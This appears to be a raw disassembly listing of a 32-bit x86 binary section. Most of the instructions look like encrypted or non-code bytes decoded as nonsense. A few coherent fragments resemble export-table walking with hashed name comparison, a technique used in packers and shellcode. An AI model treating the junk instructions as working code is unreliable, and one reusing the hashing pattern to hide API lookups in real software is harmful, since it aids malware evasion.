  40b455:	fmul   DWORD PTR [ecx-0x7038c643]
  40b45b:	pop    ecx
  40b45c:	retf   0x14c8
  40b45f:	mov    al,ds:0x8ee48e64
  40b464:	int    0x46
  40b466:	repnz mov ebx,0x4c595503
  40b46c:	cmp    DWORD PTR [esi],0xa5f2e45b
  40b472:	xchg   edi,eax
  40b473:	sbb    eax,0x9d55fba0
  40b478:	dec    ebp
  40b479:	pop    esp
  40b47a:	aad    0xca
  40b47c:	out    dx,al
  40b47d:	inc    edx
  40b47e:	pop    ecx
  40b47f:	les    ebx,FWORD PTR [esi-0x13457fa1]
  40b485:	(bad)  
  40b486:	cmp    DWORD PTR [edx-0x49b86a16],eax
  40b48c:	daa    
  40b48d:	retf   0x4519
  40b490:	inc    edi
  40b491:	aam    0xe8
  40b493:	pop    edi
  40b494:	mov    ch,0x5a
  40b496:	out    dx,eax
  40b497:	mov    ebx,0xa00112e0
  40b49c:	fnstcw WORD PTR [ecx+0x25]
  40b49f:	xor    bh,BYTE PTR [ebx-0x3e]
  40b4a2:	mov    esp,0xe5c46861
  40b4a7:	inc    esp
  40b4a8:	neg    BYTE PTR [edi+ecx*8]
  40b4ab:	push   edi
  40b4ac:	cmp    bh,BYTE PTR [ebp+eax*1+0x779d098b]
  40b4b3:	sbb    al,0x1a
  40b4b5:	gs inc esi
  40b4b7:	shl    ecx,cl
  40b4b9:	dec    esp
  40b4ba:	dec    esp
  40b4bb:	cwde   
  40b4bc:	xor    eax,0xa5f4de87
  40b4c1:	sub    al,0xfa
  40b4c3:	and    BYTE PTR [ebp+0x48],al
  40b4c6:	in     al,0xa4
  40b4c8:	scas   eax,DWORD PTR es:[edi]
  40b4c9:	mov    ah,0x62
  40b4cb:	mov    DWORD PTR [eax+0x24],0x6d9aa691
  40b4d2:	pop    DWORD PTR [ecx-0x2bb2761a]
  40b4d8:	mov    eax,DWORD PTR [ebp-0x14]
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	mov    al,ds:0xe8eaf8a9
  40b50c:	lock jle 0x40b58d
  40b50f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b513:	dec    edi
  40b514:	mov    DWORD PTR [ebp+ebp*2+0x590752f9],edx
  40b51b:	mov    ds:0xc88c68a,eax
  40b520:	sub    al,0xf4
  40b522:	fsubr  DWORD PTR [esi+ebx*2-0x4e277a23]
  40b529:	inc    edi
  40b52a:	inc    esi
  40b52b:	mov    edx,0xa76d679c
  40b530:	into   
  40b531:	ins    DWORD PTR es:[edi],dx
  40b532:	cmovl  edi,DWORD PTR [edi+esi*1]
  40b536:	iret   
  40b537:	xchg   ebp,eax
  40b538:	clc    
  40b539:	adc    ebx,esp
  40b53b:	hlt    
  40b53c:	xchg   esi,ebx
  40b53e:	test   BYTE PTR [ebx],cl
  40b540:	or     BYTE PTR [edi+0x64],ah
  40b543:	das    
  40b544:	in     eax,0x7c
  40b546:	sub    ebp,DWORD PTR [edx]
  40b548:	retf   0xd288
  40b54b:	loop   0x40b4e7
  40b54d:	dec    esi
  40b54e:	xchg   ebp,eax
  40b54f:	xchg   esi,eax
  40b550:	sbb    DWORD PTR [ebx],eax
  40b552:	inc    ebp
  40b553:	arpl   bp,bx
  40b555:	xchg   ebp,eax
  40b556:	sub    cl,BYTE PTR [ecx+0x19]
  40b559:	loope  0x40b56c
  40b55b:	cld    
  40b55c:	xor    DWORD PTR [ecx+esi*8],ecx
  40b55f:	inc    ebx
  40b560:	jge    0x40b579
  40b562:	sbb    BYTE PTR [ebp+0x6cc54f4c],ch
  40b568:	jge    0x40b554
  40b56a:	inc    edx
  40b56b:	mov    dl,0xbb
  40b56d:	popf   
  40b56e:	push   ebx
  40b56f:	out    0x29,eax
  40b571:	dec    ebp
  40b572:	sbb    DWORD PTR [ebp+0x5d],0xa25df9e6
  40b579:	pop    edi
  40b57a:	mov    WORD PTR [esi+0x1f],cs
  40b57d:	arpl   WORD PTR gs:[ecx+0x1d],bp
  40b581:	in     al,0x51
  40b583:	shl    DWORD PTR [esi],1
  40b585:	clc    
  40b586:	rcr    DWORD PTR [ebx+esi*1-0x1b1c20d],1
  40b58d:	ja     0x40b548
  40b58f:	push   ds
  40b590:	xchg   edx,eax
  40b591:	test   eax,0xb450a43e
  40b596:	adc    BYTE PTR [edx+0x4],0x24
  40b59a:	outs   dx,BYTE PTR ds:[esi]
  40b59b:	jnp    0x40b57f
  40b59d:	in     al,dx
  40b59e:	jb     0x40b5ad
  40b5a0:	repz (bad) 
  40b5a3:	jbe    0x40b53f
  40b5a5:	test   BYTE PTR [ebx],bh
  40b5a7:	pop    edx
  40b5a8:	xor    al,0x26
  40b5aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5ab:	pop    edx
  40b5ac:	ins    BYTE PTR es:[edi],dx
  40b5ad:	popa   
  40b5ae:	pusha  
  40b5af:	jp     0x40b60e
  40b5b1:	push   cs
  40b5b2:	jle    0x40b605
  40b5b4:	dec    ecx
  40b5b5:	cmp    eax,0x571ee5f4
  40b5ba:	mov    ebx,0x4c4c199e
  40b5bf:	pop    edx
  40b5c0:	fstp   TBYTE PTR [ebp*8+0x5e002735]
  40b5c7:	ret    0x73d0
  40b5ca:	sbb    al,0xab
  40b5cc:	mov    ebp,0xf0fa16c1
  40b5d1:	fiadd  DWORD PTR [edi]
  40b5d3:	mov    al,ds:0xc66d1511
  40b5d8:	sub    ecx,edx
  40b5da:	jne    0x40b563
  40b5dc:	stos   DWORD PTR es:[edi],eax
  40b5dd:	test   al,0x28
  40b5df:	daa    
  40b5e0:	inc    ebp
  40b5e1:	nop
  40b5e2:	daa    
  40b5e3:	jne    0x40b5ea
  40b5e5:	xchg   ebx,eax
  40b5e6:	out    dx,al
  40b5e7:	push   ds
  40b5e8:	(bad)
  40b5eb:	dec    edx
  40b5ec:	das    
  40b5ed:	rcr    DWORD PTR [esi+0x367442bf],1
  40b5f3:	shl    bl,0x0
  40b5f6:	pop    es
  40b5f7:	ja     0x40b598
  40b5f9:	xor    DWORD PTR [esp+edi*8],ebx
  40b5fc:	and    al,BYTE PTR [ebx+0x11b718f1]
  40b602:	inc    esi
  40b603:	push   ds
  40b604:	call   0x1a1fb695
  40b609:	cmp    al,0xa6
  40b60b:	or     edx,DWORD PTR [ebx]
  40b60d:	shr    DWORD PTR [ebx+0xfe02e4f],0xfb
  40b614:	scas   eax,DWORD PTR es:[edi]
  40b615:	out    dx,al
  40b616:	inc    eax
  40b617:	jge    0x40b628
  40b619:	or     DWORD PTR [ebp-0x21],ecx
  40b61c:	xchg   edx,eax
  40b61d:	rcl    BYTE PTR [edi-0x3abcc38a],cl
  40b623:	sub    BYTE PTR [edi+0x21e2300f],al
  40b629:	dec    ebp
  40b62a:	inc    ebp
  40b62b:	add    al,0x89
  40b62d:	iret   
  40b62e:	fldenv [edx]
  40b630:	loope  0x40b682
  40b632:	inc    ebx
  40b633:	imul   eax,DWORD PTR [ebx],0xd23eb17
  40b639:	stc    
  40b63a:	fs jmp 0x62d4:0x6eddf98
  40b642:	out    0x32,al
  40b644:	xor    al,0x35
  40b646:	test   al,0xfe
  40b648:	xchg   ebx,eax
  40b649:	pop    edi
  40b64a:	int3   
  40b64b:	or     ecx,0xd
  40b64e:	retf   0x2774
  40b651:	cmp    eax,0xc3dedfbd
  40b656:	sbb    BYTE PTR [ebx+0x10a42360],ah
  40b65c:	cmp    al,0xaa
  40b65e:	outs   dx,DWORD PTR ds:[esi]
  40b65f:	add    bl,BYTE PTR [ebx+eiz*8]
  40b662:	mov    al,0x27
  40b664:	lds    ebx,FWORD PTR [edi]
  40b666:	inc    edi
  40b667:	out    dx,al
  40b668:	jl     0x40b5fa
  40b66a:	pop    es
  40b66b:	imul   eax,DWORD PTR [eax+0x3a],0x7da9a98
  40b672:	test   bh,dl
  40b674:	sbb    edi,DWORD PTR [edi]
  40b676:	adc    BYTE PTR [ecx+ecx*1+0x4939c5db],cl
  40b67d:	ins    DWORD PTR es:[edi],dx
  40b67e:	jmp    0xdecf:0x780e53e8
  40b685:	dec    BYTE PTR [esi+0x72]
  40b688:	xor    al,0x57
  40b68a:	ins    BYTE PTR es:[edi],dx
  40b68b:	sbb    al,0x6d
  40b68d:	in     al,dx
  40b68e:	jp     0x40b693
  40b690:	add    eax,0xe0e0a850
  40b695:	stos   BYTE PTR es:[edi],al
  40b696:	adc    ebp,edx
  40b698:	int    0x9a
  40b69a:	mov    eax,0x93d356a1
  40b69f:	xor    ebp,0xffffffd1
  40b6a2:	add    cl,BYTE PTR [ebp+0x33]
  40b6a5:	dec    esi
  40b6a6:	jb     0x40b642
  40b6a8:	cmc    
  40b6a9:	inc    bx
  40b6ab:	popf   
  40b6ac:	lods   eax,DWORD PTR ds:[esi]
  40b6ad:	mov    WORD PTR [ecx+0x64],?
  40b6b0:	mov    ebx,0xa19042e2
  40b6b5:	dec    eax
  40b6b6:	xchg   edi,eax
  40b6b7:	cmp    esp,DWORD PTR [eax-0x1a]
  40b6ba:	mov    cl,0xeb
  40b6bc:	xchg   esi,eax
  40b6bd:	div    dh
  40b6bf:	fcomp  DWORD PTR [edi-0x4b]
  40b6c2:	xchg   edx,eax
  40b6c3:	xchg   esp,eax
  40b6c4:	inc    ecx
  40b6c5:	stos   BYTE PTR es:[edi],al
  40b6c6:	jmp    0x40b69a
  40b6c8:	xor    al,0x40
  40b6ca:	fisttp WORD PTR [ebx]
  40b6cc:	ss push 0xffffffca
  40b6cf:	call   0xfbd3:0x4d4de48d
  40b6d6:	xor    al,0x67
  40b6d8:	mov    DWORD PTR [ebp+0x52e06f0b],ebp
  40b6de:	xchg   DWORD PTR [ecx],edi
  40b6e0:	iret   
  40b6e1:	fsub   QWORD PTR [ecx-0x56]
  40b6e4:	mov    ebp,0x6d1052a
  40b6e9:	fwait
  40b6ea:	xlat   BYTE PTR ds:[ebx]
  40b6eb:	fiadd  WORD PTR [edx+0x33]
  40b6ee:	stc    
  40b6ef:	cmp    dl,BYTE PTR [ebp-0xd96ab7c]
  40b6f5:	cmp    bh,BYTE PTR [ebx]
  40b6f7:	aad    0x7b
  40b6f9:	or     BYTE PTR ds:0x608774d6,cl
  40b6ff:	and    al,0x19
  40b701:	dec    edi
  40b702:	loop   0x40b717
  40b704:	xchg   ebp,eax
  40b705:	cmp    eax,edx
  40b707:	pop    esi
  40b708:	mov    WORD PTR [esi],?
  40b70a:	mov    ds:0x7d746c8a,eax
  40b70f:	loope  0x40b70e
  40b711:	in     eax,0x16
  40b713:	cdq    
  40b714:	mov    esi,0xdf940cb4
  40b719:	push   ebx
  40b71a:	lock cmp DWORD PTR [edi-0x55c39e48],ecx
  40b721:	scas   eax,DWORD PTR es:[edi]
  40b722:	sahf   
  40b723:	rcl    DWORD PTR [esi-0x29],0x0
  40b727:	inc    ebx
  40b728:	jb     0x40b7a9
  40b72a:	add    cl,BYTE PTR [ebp+0x13]
  40b72d:	mul    BYTE PTR [ecx-0x1e]
  40b730:	jo     0x40b74f
  40b732:	cdq    
  40b733:	fistp  DWORD PTR [edx-0x8]
  40b736:	pop    esi
  40b737:	sub    cl,ah
  40b739:	and    cl,BYTE PTR [ebp+0x7]
  40b73c:	push   edx
  40b73d:	ds inc ebx
  40b73f:	cmp    DWORD PTR [ebx],ebx
  40b741:	ins    DWORD PTR es:[edi],dx
  40b742:	push   esi
  40b743:	add    eax,0xff2be0bb
  40b748:	inc    edx
  40b749:	cmp    DWORD PTR ds:0x9cfbbc1e,ebp
  40b74f:	ficomp WORD PTR [ebx]
  40b751:	and    DWORD PTR [ecx+ebp*8+0x13fb10bc],ecx
  40b758:	push   ds
  40b759:	push   DWORD PTR [ebp-0x30]
  40b75c:	push   DWORD PTR [ebp+0xc]
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	xchg   ecx,eax
  40b78b:	icebp  
  40b78c:	mov    esp,0x7efeb217
  40b791:	jle    0x40b7cb
  40b793:	jl     0x40b813
  40b795:	jle    0x40b7da
  40b797:	sbb    edx,eax
  40b799:	pop    edi
  40b79a:	xchg   esi,eax
  40b79b:	mov    edx,0xef21e9a2
  40b7a0:	sub    DWORD PTR [ecx-0x1b],esp
  40b7a3:	(bad)  
  40b7a5:	ins    BYTE PTR es:[edi],dx
  40b7a6:	cmc    
  40b7a7:	icebp  
  40b7a8:	mul    BYTE PTR [esp+eiz*2+0x74]
  40b7ac:	mov    ds:0x59129bf,eax
  40b7b1:	push   es
  40b7b2:	inc    esi
  40b7b3:	ror    BYTE PTR [edi-0x264cb34b],cl
  40b7b9:	cwde   
  40b7ba:	int3   
  40b7bb:	inc    ebp
  40b7bc:	mov    esi,0x234bb8e4
  40b7c1:	sbb    DWORD PTR [ebp-0x41],ebx
  40b7c4:	test   DWORD PTR [esi-0x58],ebp
  40b7c7:	dec    ebx
  40b7c8:	aaa    
  40b7c9:	push   esp
  40b7ca:	mov    al,0x45
  40b7cc:	inc    edx
  40b7cd:	xor    eax,0x23863a56
  40b7d2:	and    al,0xe0
  40b7d4:	xchg   ebx,eax
  40b7d5:	lds    edx,FWORD PTR [esi-0x4d]
  40b7d8:	mov    dl,0xb7
  40b7da:	xchg   ecx,eax
  40b7db:	xor    ebx,esp
  40b7dd:	mov    bl,0x5
  40b7df:	arpl   di,cx
  40b7e1:	sbb    DWORD PTR [esi+ebp*1],ebx
  40b7e4:	adc    eax,0xa2e7bf98
  40b7e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7ea:	sub    DWORD PTR [ecx-0x78],0x8c3d5b0d
  40b7f1:	xor    cl,BYTE PTR [eax]
  40b7f3:	and    al,0xed
  40b7f5:	std    
  40b7f6:	cmp    eax,0x907745e1
  40b7fb:	mov    esi,0xb33d7c2f
  40b800:	jmp    0xe81a:0x5c144a1d
  40b807:	xchg   BYTE PTR [edi-0x1e88bf5e],dl
  40b80d:	leave  
  40b80e:	inc    edx
  40b80f:	je     0x40b7e4
  40b811:	push   esp
  40b812:	pop    esp
  40b813:	push   cs
  40b814:	add    ebx,eax
  40b816:	mov    ds:0x8d96e03b,eax
  40b81b:	sti    
  40b81c:	dec    ebp
  40b81d:	add    esp,DWORD PTR [ecx+esi*1]
  40b820:	stc    
  40b821:	adc    al,BYTE PTR [eax+0x28fdecaa]
  40b827:	gs cmp al,0x3a
  40b82a:	or     BYTE PTR [ebx+0x3d1fb9ee],bl
  40b830:	out    dx,eax
  40b831:	push   cs
  40b832:	test   al,0x26
  40b834:	dec    ebp
  40b835:	cs and eax,0x8a6bba69
  40b83b:	pop    ebp
  40b83c:	mov    esp,0xc834f20d
  40b841:	das    
  40b842:	xchg   ebp,eax
  40b843:	and    BYTE PTR [esi+0x6e],ah
  40b846:	sar    edx,1
  40b848:	jl     0x40b89f
  40b84a:	mov    ds:0x3a76ef35,eax
  40b84f:	xchg   edx,eax
  40b850:	push   esp
  40b851:	mov    WORD PTR ds:0xdc2dc4ac,?
  40b857:	dec    esi
  40b858:	pop    edx
  40b859:	loop   0x40b867
  40b85b:	fld    DWORD PTR [ecx]
  40b85d:	sbb    ch,bl
  40b85f:	mov    edi,0x49a8238c
  40b864:	adc    al,0xce
  40b866:	or     BYTE PTR [ebp-0x238af3cc],cl
  40b86c:	clc    
  40b86d:	or     eax,0x63d51aa3
  40b872:	pop    edx
  40b873:	mov    WORD PTR [ecx],?
  40b875:	out    0xbe,eax
  40b877:	fcomi  st,st(7)
  40b879:	xor    edx,DWORD PTR ds:0x980056ce
  40b87f:	out    0x60,al
  40b881:	retf   0xe44b
  40b884:	inc    esp
  40b885:	fdivr  st(4),st
  40b887:	not    BYTE PTR [edi-0x588bcfab]
  40b88d:	push   ecx
  40b88e:	retf   
  40b88f:	dec    esp
  40b890:	das    
  40b891:	(bad)  
  40b892:	adc    esi,eax
  40b894:	inc    ecx
  40b895:	xchg   DWORD PTR [edi],esi
  40b897:	(bad)  
  40b898:	and    eax,0xc13c4f19
  40b89d:	aad    0x55
  40b89f:	repnz loopne 0x40b84d
  40b8a2:	int3   
  40b8a3:	sbb    eax,0x12560683
  40b8a8:	outs   dx,BYTE PTR ds:[esi]
  40b8a9:	nop
  40b8aa:	lods   eax,DWORD PTR ds:[esi]
  40b8ab:	mov    ecx,0xf5a6f40f
  40b8b0:	sahf   
  40b8b1:	xchg   ecx,eax
  40b8b2:	pop    es
  40b8b3:	dec    ebx
  40b8b4:	mov    bh,0xe4
  40b8b6:	adc    BYTE PTR [ebp+0x1e],dh
  40b8b9:	jmp    0xe4457f75
  40b8be:	jno    0x40b854
  40b8c0:	cmp    DWORD PTR [edx+0x5f],ebp
  40b8c3:	out    0xc0,al
  40b8c5:	test   al,0x2
  40b8c7:	pop    edi
  40b8c8:	xor    eax,0xf265d5
  40b8cd:	or     BYTE PTR [esi+ebx*1+0x4ec916ad],ch
  40b8d4:	je     0x40b92b
  40b8d6:	pop    ebp
  40b8d7:	jl     0x40b912
  40b8d9:	sbb    BYTE PTR [edi+0x1],ah
  40b8dc:	cmp    al,0x2c
  40b8de:	jle    0x40b860
  40b8e0:	fdivrp st(5),st
  40b8e2:	adc    eax,0xfde56781
  40b8e7:	dec    ebp
  40b8e8:	out    0x77,eax
  40b8ea:	jns    0x40b933
  40b8ec:	jmp    0xb9c7ced6
  40b8f1:	lods   eax,DWORD PTR ds:[esi]
  40b8f2:	inc    ebx
  40b8f3:	dec    edi
  40b8f4:	das    
  40b8f5:	mov    bh,0x1
  40b8f7:	retf   0x7923
  40b8fa:	add    BYTE PTR [edi+0x66],dh
  40b8fd:	(bad)  
  40b8fe:	xlat   BYTE PTR ds:[ebx]
  40b8ff:	mov    edi,0x78ca2159
  40b904:	jb     0x40b89e
  40b906:	mov    dh,0x6b
  40b908:	or     BYTE PTR [esi-0x53],0x6b
  40b90c:	xlat   BYTE PTR ds:[ebx]
  40b90d:	xor    al,0x88
  40b90f:	hlt    
  40b910:	sbb    ecx,eax
  40b912:	fimul  WORD PTR [edi]
  40b914:	jnp    0x40b8e6
  40b916:	mov    eax,0x17872c7b
  40b91b:	adc    al,0xd3
  40b91d:	loopne 0x40b8f5
  40b91f:	push   edx
  40b920:	fldcw  WORD PTR [edx+0x949b89]
  40b926:	mul    BYTE PTR [eax+0x3d]
  40b929:	and    cl,BYTE PTR [esi+ecx*4+0x6b]
  40b92d:	call   0xbd27:0xf69d2a40
  40b934:	jo     0x40b987
  40b936:	in     al,0xc9
  40b938:	fwait
  40b939:	inc    ecx
  40b93a:	xor    al,0x63
  40b93c:	mov    ebp,DWORD PTR [edx]
  40b93e:	stos   BYTE PTR es:[edi],al
  40b93f:	ret    
  40b940:	jl     0x40b957
  40b942:	xchg   BYTE PTR [ebx-0x2b],dh
  40b945:	adc    al,0xa0
  40b947:	pop    edx
  40b948:	pusha  
  40b949:	xchg   ebp,eax
  40b94a:	or     al,0x84
  40b94c:	pop    ecx
  40b94d:	xchg   BYTE PTR [eax+edx*4],dh
  40b950:	cdq    
  40b951:	imul   edx,DWORD PTR [ebp-0x63],0xffffffd1
  40b955:	cld    
  40b956:	imul   ecx,esp,0xffffff8f
  40b959:	mov    ecx,0xf984d11a
  40b95e:	ret    
  40b95f:	fsubp  st(1),st
  40b961:	dec    ebp
  40b962:	add    ebx,eax
  40b964:	arpl   WORD PTR [esi],sp
  40b966:	sar    esp,1
  40b968:	(bad)  
  40b969:	in     al,dx
  40b96a:	inc    esp
  40b96b:	aaa    
  40b96c:	lahf   
  40b96d:	(bad)  
  40b96e:	jg     0x40b995
  40b970:	xor    ch,dl
  40b972:	outs   dx,BYTE PTR ds:[esi]
  40b973:	cli    
  40b974:	in     al,dx
  40b975:	push   edx
  40b976:	mov    esp,0xa39f9947
  40b97b:	mov    fs,WORD PTR [ebx-0x63]
  40b97e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b97f:	mov    eax,0x9622373
  40b984:	adc    al,0x73
  40b986:	cmp    esi,DWORD PTR [eax]
  40b988:	lods   eax,DWORD PTR ds:[esi]
  40b989:	add    ebp,edx
  40b98b:	sub    DWORD PTR [ebx+0xd757638],ebx
  40b991:	or     eax,0x2f25bdeb
  40b996:	jbe    0x40b922
  40b998:	call   0x21e3a3d
  40b99d:	mov    ds,WORD PTR [esp+eax*4+0x3353cd04]
  40b9a4:	pop    edx
  40b9a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9a6:	(bad)  
  40b9a8:	mov    esp,edx
  40b9aa:	loopne 0x40b954
  40b9ac:	xor    ch,BYTE PTR [esi]
  40b9ae:	leave  
  40b9af:	loop   0x40b9b5
  40b9b1:	in     eax,0xfa
  40b9b3:	xor    ebx,edx
  40b9b5:	mov    DWORD PTR [edx],esp
  40b9b7:	aaa    
  40b9b8:	inc    ebx
  40b9b9:	sbb    al,0xd7
  40b9bb:	int    0xde
  40b9bd:	adc    BYTE PTR ds:0x766d1f88,bh
  40b9c3:	xor    eax,0xa806e97c
  40b9c8:	jge    0x40b9e5
  40b9ca:	stos   DWORD PTR es:[edi],eax
  40b9cb:	mov    dh,0x40
  40b9cd:	mov    ebx,0xdf810ced
  40b9d2:	outs   dx,DWORD PTR ds:[esi]
  40b9d3:	inc    edi
  40b9d4:	in     eax,0x43
  40b9d6:	(bad)  
  40b9d7:	add    BYTE PTR [ebp-0x74444724],al
  40b9dd:	inc    ebp
  40b9de:	loopne 0x40ba27
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8-0x3aad57f8],eax
  40ba0f:	fs (bad) 
  40ba11:	jl     0x40ba10
  40ba13:	jle    0x40ba93
  40ba15:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ba19:	cwde   
  40ba1a:	imul   ecx,ebx,0x4a
  40ba1d:	test   BYTE PTR [edi-0x6c],dh
  40ba20:	pusha  
  40ba21:	xchg   ecx,eax
  40ba22:	fsubr  st,st(0)
  40ba24:	dec    esp
  40ba25:	rcl    BYTE PTR [eax],cl
  40ba27:	popa   
  40ba28:	push   esp
  40ba29:	sub    dl,BYTE PTR [ecx+ebx*4+0x13]
  40ba2d:	fwait
  40ba2e:	test   DWORD PTR [edi-0x1baaf7b5],esi
  40ba34:	jg     0x40ba97
  40ba36:	push   ebx
  40ba37:	test   eax,0x6d21f059
  40ba3c:	fsub   QWORD PTR [edx+0xb]
  40ba3f:	dec    esp
  40ba40:	fabs   
  40ba42:	pusha  
  40ba43:	cmp    eax,0x9a25be77
  40ba48:	push   ebx
  40ba49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba4a:	test   al,0x3f
  40ba4c:	mov    BYTE PTR [edx+edi*1],bh
  40ba4f:	jp     0x40ba61
  40ba51:	rcl    DWORD PTR [edi+ebp*2+0x2a49de5],cl
  40ba58:	cdq    
  40ba59:	aad    0xc2
  40ba5b:	repz mov bh,0x83
  40ba5e:	stos   BYTE PTR es:[edi],al
  40ba5f:	bnd jbe 0x40bada
  40ba62:	loop   0x40ba13
  40ba64:	jg     0x40ba31
  40ba66:	mov    ecx,0xb3bd7c2a
  40ba6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba6c:	dec    edx
  40ba6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba6e:	add    BYTE PTR [eax-0x57],bl
  40ba71:	mov    eax,0x44cac938
  40ba76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba77:	stc    
  40ba78:	in     al,dx
  40ba79:	fucomi st,st(0)
  40ba7b:	mov    eax,0x9a806d80
  40ba80:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40ba82:	test   eax,0x233e024c
  40ba87:	adc    al,0x37
  40ba89:	jge    0x40ba9d
  40ba8b:	xor    esi,DWORD PTR [ecx-0x73b1804b]
  40ba91:	jnp    0x40bac6
  40ba93:	imul   cx,ax,0x3fd
  40ba98:	pop    ss
  40ba99:	test   cl,ch
  40ba9b:	(bad)  
  40ba9d:	and    ebx,edi
  40ba9f:	push   edi
  40baa0:	push   ebp
  40baa1:	sbb    al,0xa8
  40baa3:	inc    ebp
  40baa4:	jo     0x40ba81
  40baa6:	xor    ah,BYTE PTR ds:0xdb33123e
  40baac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40baad:	enter  0xaa94,0x5
  40bab1:	adc    eax,0x779eb0ee
  40bab6:	or     eax,0x7c6b2fb8
  40babb:	test   DWORD PTR [eax+0x22ab2aae],edx
  40bac1:	pop    ebp
  40bac2:	fmul   DWORD PTR [ebp-0x3a]
  40bac5:	aad    0x5b
  40bac7:	xchg   edx,eax
  40bac8:	iret   
  40bac9:	test   al,0x67
  40bacb:	fdivr  QWORD PTR [edx-0x1eaafdc4]
  40bad1:	push   0x52e6d09f
  40bad6:	cli    
  40bad7:	inc    ebx
  40bad8:	mov    ah,0x2d
  40bada:	data16 mov ch,0xb8
  40badd:	test   al,0x15
  40bae0:	ds ins DWORD PTR es:[edi],dx
  40bae2:	push   ebp
  40bae3:	xchg   ebx,eax
  40bae4:	fs scas eax,DWORD PTR es:[edi]
  40bae6:	iret   
  40bae7:	add    eax,0x9a7622b6
  40baec:	sub    DWORD PTR [edi+0xa],edi
  40baef:	ror    DWORD PTR [ebx-0x3560d9f9],1
  40baf5:	pop    es
  40baf6:	(bad)  
  40baf7:	jno    0x40bb51
  40baf9:	addr16 xchg cx,ax
  40bafc:	mov    WORD PTR [eax],fs
  40bafe:	mov    bl,0x2d
  40bb00:	and    ebx,ebp
  40bb02:	xchg   edi,eax
  40bb03:	pop    es
  40bb04:	(bad)  
  40bb05:	sbb    bh,BYTE PTR [edi]
  40bb07:	or     eax,0x9a15e39b
  40bb0c:	aam    0x67
  40bb0e:	ss and eax,0xa1dfb9c1
  40bb14:	jecxz  0x40baf1
  40bb16:	or     bl,BYTE PTR [ecx+0x40]
  40bb19:	or     al,0x61
  40bb1b:	mov    esp,0xffdcd2e7
  40bb20:	and    ecx,DWORD PTR [ebx]
  40bb22:	(bad)  
  40bb23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb24:	call   0x81a7:0xf9fa2801
  40bb2b:	sub    eax,0x8d59d74c
  40bb30:	retf   0xc84c
  40bb33:	xchg   esi,eax
  40bb34:	(bad)  [edi-0x423b9da0]
  40bb3a:	in     al,0xe4
  40bb3c:	pusha  
  40bb3d:	icebp  
  40bb3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb3f:	jbe    0x40bae3
  40bb41:	pop    eax
  40bb42:	outs   dx,DWORD PTR ds:[esi]
  40bb43:	imul   ebp,eax,0x3a1463b0
  40bb49:	pop    esp
  40bb4a:	mov    bl,BYTE PTR ds:0xff33bde2
  40bb50:	mov    dl,0x93
  40bb52:	gs jp  0x83c85f12
  40bb59:	outs   dx,BYTE PTR ds:[esi]
  40bb5a:	jmp    0xa98e:0x8b610f1c
  40bb61:	xchg   ebp,eax
  40bb62:	cli    
  40bb63:	pop    ss
  40bb64:	fld    TBYTE PTR [edi+0x0]
  40bb67:	cmp    bl,BYTE PTR [esi+esi*4-0x34]
  40bb6b:	loope  0x40bbce
  40bb6d:	ins    BYTE PTR es:[edi],dx
  40bb6e:	xchg   bh,cl
  40bb70:	xor    eax,0xca7606cf
  40bb75:	push   edi
  40bb76:	mov    bl,0x34
  40bb78:	push   0x53e92df6
  40bb7d:	dec    esp
  40bb7e:	mov    ds:0xc2ee5ea9,eax
  40bb83:	mov    bh,0x24
  40bb85:	shr    DWORD PTR [ebx-0x1ee69433],cl
  40bb8b:	fstp   DWORD PTR [esi]
  40bb8d:	dec    edi
  40bb8e:	push   cs
  40bb8f:	sub    eax,0x7dff7a5c
  40bb94:	xchg   DWORD PTR [edi+0x676e9099],edx
  40bb9a:	(bad)  
  40bb9b:	popa   
  40bb9c:	xchg   ebx,eax
  40bb9d:	(bad)  
  40bb9e:	pusha  
  40bb9f:	dec    edi
  40bba0:	mov    bh,0xc1
  40bba2:	aas    
  40bba3:	mov    ds:0xe99ebe27,eax
  40bba8:	pop    esi
  40bba9:	pop    esi
